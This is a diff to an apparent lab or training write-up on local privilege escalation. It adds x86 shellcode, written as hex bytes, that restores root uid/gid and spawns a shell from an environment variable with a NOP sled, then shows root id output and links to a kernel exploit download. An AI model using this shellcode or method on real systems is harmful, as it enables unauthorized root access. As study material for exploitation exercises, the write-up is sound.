@@ -683,8 +683,13 @@ So, get some [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.h
 export it in a env variable with a `nop` sled of course, and compile our
 `./scripts/getaddr.c` to get the env variable address.
 
+I will use this [shellcode](https://shell-storm.org/shellcode/files/shellcode-251.html)
+instead because it sets the `uid` and `gid` to the `euid` and `egid`.
+
 ```bash
-export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+#export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+# This payload stes
+export SC=$(python -c "print '\x90'*100+'\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
 
 gcc getaddr.c -o getaddr
 ./getaddr SC
@@ -704,6 +709,8 @@ And there we go:
 ```bash
 # whoami
 root
+# id
+uid=0(root) gid=0(root) groups=0(root),1005(zaz)
 ```
 
 ### Writeup 2
@@ -718,9 +725,22 @@ su firefart
 
 We could also exploit `grub`, but the subjects do not let us do so.
 
+### Writeup 3
+
+```bash
+https://www.exploit-db.com/download/33824
+```
+
 ## Parrot
 
 I used the following docker most of the time:
 ```bash
 docker run --rm -ti --network host -v $PWD:/host parrotsec/security
+```
+
+On the docker:
+```bash
+apt update
+apt install vim python3-pip
+python3 -m pip install pwntools
 ```
